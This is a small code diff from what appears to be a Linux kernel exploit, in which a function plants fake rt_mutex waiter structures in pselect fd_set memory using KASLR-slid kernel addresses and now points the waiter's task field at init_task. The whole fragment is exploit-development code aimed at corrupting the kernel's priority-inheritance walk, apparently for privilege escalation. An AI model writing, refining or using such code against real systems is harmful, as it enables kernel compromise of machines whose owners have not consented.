@@ -129,6 +129,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      * real kernel objects with a live rbtree-compatible shape, so the PI
      * walk erases/reinserts against memory that exists instead of
      * dereferencing NULL tree pointers (the pre-fix consumer panic). */
+    /* waiter->task must be a real task_struct: the PI walk reads many fields
+     * we don't plant, and the rest of the page is 0x41 filler. */
+
     struct pselect_waiter_word words[] = {
       {2, SLIDE_LOGGERS_0_1, "tree_pc"},
       {3, 0, "tree_right"},
@@ -136,7 +139,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
       {5, SLIDE_LOGGERS_0_1, "pi_pc"},
       {6, 0, "pi_right"},
       {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
-      {8, fake_task, "task"},
+      {8, SLIDE_INIT_TASK, "task"},
       {9, fake_lock, "lock"},
       {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
       {11, 0, "deadline"},
